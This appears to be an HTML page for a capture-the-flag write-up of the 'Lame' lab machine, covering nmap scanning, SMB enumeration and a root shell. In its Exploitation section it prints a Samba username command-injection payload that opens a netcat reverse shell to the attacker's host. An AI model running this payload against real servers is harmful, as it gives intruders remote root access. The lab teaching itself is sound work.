@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>Lame</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>Lame Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*C5b9RSHXGJ1DtnM2cqkIug.png">
+            <h2>Reconnaissance</h2>
+            <p class="paragraph">
+                First we will start with nmap to discover open ports:
+                <p class="script-container">
+                    nmap -p- -T5 10.129.159.8 
+                </p>
+                - -p- scan all 65536 ports.
+                - -T5 make the scan as fast as possible where (-T0 = slow and stealthy | -T1 =<br>a bit more faster but still slow| -T2 = moderate speed | -T3 = Diffault speed<br>| -T4 = fast but still can be a bit stealthy | -T5 = insanely fast and not stealthy at all)
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*l1u4p5huQz9bXLZFSQRxWQ.png">
+            <p class="paragraph">
+                The nmap open ports scan showed us 4 open ports (21,22,445,3632)<br><br>
+                now we will use nmap again to find what is running on this ports:
+                <p class="script-container">
+                    nmap -p 21,22,139,3632 -A 10.129.159.8
+                </p>
+                - p 21,22,139,3632 here we specified only the open ports that we found in<br>previous step, we separated the nmap scan to two steps because we<br>wanted to find the open ports first then move to scan what is running<br>only the discovered ports which saves us some time.
+                - -A Enable OS detection, version detection, script scanning, and traceroute.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*8hLjTMSVUYkIpcNhJbx1lQ.png">
+            <h2>Enumeration</h2>
+            <p class="paragraph">
+                lets start from port 21 which is running ftp server with version vsftpd 2.3.4.<br><br>
+                The first thing to do is using google to see if there is any know vulnerabilities<br>for this, after quick research we found that vsftpd 2.3.4 is vulnerable and<br>there is a Metasploit exploit for it. But after using the exploit on Metasploit it<br>failed!
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*9kbR_iu6lIAXiF6srFooLQ.png">
+            <p class="paragraph">
+                if we go back to nmap and search on it scripts:
+                <p class="script-container">
+                    ls /usr/share/nmap/scripts/ftp*
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Z_ZHUP6Bu_483twNd9CcKw.png">
+            <p class="paragraph">
+                we can use this script to see if the target is vulnerable:
+                <p class="script-container">
+                    nmap --script ftp-vsftpd-backdoor -p 21 10.129.159.8
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*LyiNU0i0kCtAiAWnJ4AnrQ.png">
+            <p class="paragraph">
+                unfortunately the target is not vulnerable on port 21.<br><br>
+                Port 22 ssh: we can do some username and password spraying on this port<br>using hydra but it might takes long time, so we will leave it for now and try to<br>find a way on another ports.<br><br>
+                Port 139 and 445 SMB:<br><br>
+                lets connect to the smb server using tool called smnclient:
+                <p class="script-container">
+                    smbclient -L 10.129.159.8
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*W5iOxfDVXF7DuIUmDqzDRg.png">
+            <p class="paragraph">
+                as we can see from the smbclient result, we have a tmp folder and in the<br>comment section (oh noes!) which makes us thing there is something here<br>we can use.<br><br>
+                lets find the permissions for the drives:
+                <p class="script-container">
+                    smbmap -H 10.129.159.8
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*gNzHTxxjeKCQ8nlkY4GfCg.png">
+            <p class="paragraph">
+                as we can see we have read/write access to tmp folder! Now if we used google<br>to find how we can use this on our smb 3.0.20, we will find that there is a<br>vulnerability where we can inject a reverse shell to the username.
+            </p>
+            <h2>Exploitation</h2>
+            <p class="paragraph">
+                to exploit that vulnerability we need to access the tmp folder first:
+                <p class="script-container">
+                    smbclient //10.129.159.8/tmp
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Mi41dqQUOksLFtlyV7cmYQ.png">
+            <p class="paragraph">
+                now because we are going to use a reverse shell, we will need to set a nc listener to receve the shell:
+                <p class="script-container">
+                    nc -vlp 1234
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:626/format:webp/1*0rxCLUbM1AGV5cQCYnhs2w.png">
+            <p class="paragraph">
+                now we will go and use the smb on tmp folder to excite the shell, we will use<br>logon command which is part of the smbclient tool, its used to establish<br>a new vuid for this session by logging on again.
+                <p class="script-container">
+                    logon "/=`nc 10.10.14.33 1234 -e /bin/sh`"
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jwt9uwV53pvsLaGiXzG_HA.png">
+            <p class="paragraph">
+                now if we go back to our nc listener:
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*s_s4rRAHT86EHNni6Vw4dQ.png">
+            <p class="paragraph">
+                boom! we have our shell, and we are already root!<br><br>
+                now grab your user hash here:
+                <p class="script-container">
+                    cat /home/makis/user.txt
+                </p>
+                then you root flag here:
+                <p class="script-container">
+                    cat /root/root.txt
+                </p>
+            </p>
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
